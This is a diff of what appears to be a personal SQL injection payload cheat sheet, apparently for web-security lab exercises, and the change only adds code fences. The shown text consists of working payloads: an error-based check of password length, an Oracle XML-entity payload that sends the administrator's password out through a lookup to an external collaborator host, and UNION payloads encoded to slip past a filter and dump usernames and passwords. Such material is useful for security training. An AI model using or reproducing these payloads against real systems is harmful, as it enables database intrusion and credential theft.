@@ -1,3 +1,4 @@
+```sql
 -- When copying, don't copy first quote, the quote is only there to help with highlighting
 
 -- Number of columns:
@@ -97,11 +98,13 @@ x'||(SELECT+CASE+WHEN+LENGTH(password)%3d20+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+u
 -- Collaborator server: p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com
 
 ' '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
-
+```
+```
 -- SQL injection filter bypass via XML
 -- checked if 1 + 1 worked in store id
 
 <@hex_entities>1 <@/hex_entities>
 <@hex_entities>1 UNION SELECT NULL <@/hex_entities>
 <@hex_entities>1 UNION SELECT username || '-->' || password FROM users <@/hex_entities>
+```
 
